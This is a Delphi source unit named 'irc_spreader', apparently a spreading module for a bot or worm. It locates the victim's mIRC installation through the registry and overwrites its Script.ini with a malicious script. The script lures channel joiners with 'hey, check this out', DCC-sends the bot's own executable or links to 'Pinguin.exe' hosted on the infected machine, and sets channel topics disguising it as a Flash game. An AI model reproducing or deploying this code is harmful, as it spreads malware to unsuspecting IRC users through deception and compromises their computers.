(* created by p0ke *)
unit irc_spreader;

interface

uses
  Windows, Winsock, untFunctions;

  {$I stubbos_config.ini}

  Function StartIRC: Bool;

implementation

Function mIRCexist: Bool;
Begin
  Result := False;
  If (GetRegValue(HKEY_CLASSES_ROOT, 'ChatFile\DefaultIcon', '') <> '') Then
    Result := True;
End;

Function mIRCPath: String;
Begin
  If (mIRCExist) Then
    Result := GetRegValue(HKEY_CLASSES_ROOT, 'ChatFile\DefaultIcon', '');
End;

Function StartIRC: Bool;
Var
  F     :TextFile;
  Script:String;
  Path  :String;
Begin
  Result := False;
  If Not (mIRCExist) Then Exit;
  Path := mIRCPath;
  Path := ExtractFilePath(Path)+'Script.ini';
  Delete(Path, 1, 1);

  Script :=
  'on *:OP:*:{'#13#10+
  '  if ($opnick == $me)'#13#10+
  '  {'#13#10+
  '    TOPIC $chan LOL (Flash Game) -> http://'+ GetLocalIP +':'+IntToStr(bot_def_webserver_port)+'/Pinguin.exe'#13#10+
  '  }'#13#10'}'#13#10#13#10+

  'on *:JOIN:#:{'#13#10+
  '  MSG $nick hey, check this out'#13#10+
  '  set %rn $rand(0,1)'#13#10+
  '  if (%rn == 0) { dcc send $nick "'+ParamStr(0)+'" }'#13#10+
  '  if (%rn == 1) { msg $nick http://'+ GetLocalIP +':'+IntToStr(bot_def_webserver_port)+'/Pinguin.exe'#13#10+
  '  }';

  CopyFile(pChar(Path), pChar(Path+'-backup'), False);

  AssignFile(F, Path);
  ReWrite(F);
  Write(F, Script);
  CloseFile(F);
  Result := True;
  INC(SPREADER_IRC);
End;

end.
